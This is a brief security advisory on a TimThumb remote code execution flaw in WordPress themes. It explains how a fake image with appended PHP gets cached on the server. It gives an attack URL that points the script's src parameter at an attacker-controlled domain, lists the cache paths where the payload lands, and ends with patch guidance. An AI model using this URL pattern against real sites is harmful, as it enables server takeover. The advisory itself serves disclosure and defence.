-:: The Advisory ::-
TimThumb is prone to a Remote Code Execution vulnerability, due to the
script does not check remotely cached files properly. By crafting a
special image file with a valid MIME-type, and appending a PHP file at
the end of this, it is possible to fool TimThumb into believing that it
is a legitimate image, thus caching it locally in the cache directory.


Attack URL: (Note! Some websites uses Base64 Encoding of the src GET-request.)
http://www.target.tld/wp-content/themes/THEME/timthumb.php?src=http://blogger.com.evildomain.tld/pocfile.php

Stored file on the Target: (This can change from host to host.)
1.19: http://www.target.tld/wp-content/themes/THEME/cache/md5($src);
1.32: http://www.target.tld/wp-content/themes/THEME/cache/external_md5($src);
md5($src); means the input value of the 'src' GET-request - Hashed in MD5 format.

-:: Solution ::-
Update to the latest version 1.34 or delete the timthumb file.

a command like this in a terminal: (Thanks to rAWjAW for this info.)
find . | grep php | xargs grep -s timthumb
